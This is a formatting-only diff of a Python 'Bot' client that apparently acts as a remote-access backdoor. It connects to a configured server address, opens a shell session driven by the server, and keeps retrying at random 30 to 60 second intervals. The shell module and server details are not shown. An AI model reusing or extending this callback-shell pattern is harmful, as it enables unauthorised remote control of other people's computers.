@@ -28,6 +28,7 @@ if hasattr(sys, 'frozen'):
 IP = addr_ip
 PORT = addr_port
 
+
 class Bot(object):
 
     def __init__(self, home):
@@ -42,7 +43,8 @@ class Bot(object):
             self.shell.stop()
             self.conn.shutdown(socket.SHUT_RDWR)
             self.conn.close()
-        except:pass
+        except:
+            pass
 
     def connect(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -52,7 +54,8 @@ class Bot(object):
         services = s.connect(self.ip, self.port)
         if not services:
             self.ip, self.port, self.is_active = None, None, False
-            self.display_text('Error: Server is unavailable, trying again in a bit')
+            self.display_text(
+                'Error: Server is unavailable, trying again in a bit')
         else:
             self.shell = shell.Shell(s, services['args'], self.home)
             self.is_active = True
@@ -70,7 +73,8 @@ class Bot(object):
         except Exception as e:
             self.shutdown()
 
-if  __name__ == '__main__':
+
+if __name__ == '__main__':
     home = getcwd()
 
     while True:
@@ -81,6 +85,8 @@ if  __name__ == '__main__':
         if bot.shell:
             if bot.shell.disconnected:
                 break
-        try:sleep(randint(30, 60))
-        except:break
+        try:
+            sleep(randint(30, 60))
+        except:
+            break
         del bot
